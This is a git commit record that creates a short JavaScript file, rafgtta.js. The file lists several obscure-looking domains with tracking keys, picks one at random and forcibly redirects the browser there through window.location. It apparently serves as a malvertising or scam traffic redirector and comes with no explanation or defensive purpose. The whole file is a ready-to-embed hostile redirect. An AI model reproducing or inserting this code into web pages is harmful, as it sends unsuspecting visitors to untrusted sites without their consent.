a2e91b3eed08153bd8af4aec0704452985c8dca4
insiala2f <84434303+insiala2f@users.noreply.github.com>
2021-05-20 23:17:12 +0800

    Create rafgtta.js

---
+++ rafgtta.js
@@ -0,0 +1,10 @@
+var dataUrl = [
+  '//wonderfullytumultbizarre.com/k78nwxfv?key=e668079d92f5c385e97d9e9f30beedd3',
+  '//wonderfullytumultbizarre.com/ezuq8wdg?key=abe65c5f1fac7c85a5e79772f3e4b4ab',
+  '//wonderfullytumultbizarre.com/jrzhg39q?key=c57734d92ebaa11a56b389a5ea6dd78e',
+   '//usounoul.com/4/4252725',
+  '//poosoahe.com/4/4251123',
+  '//thaudray.com/4/4246498'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
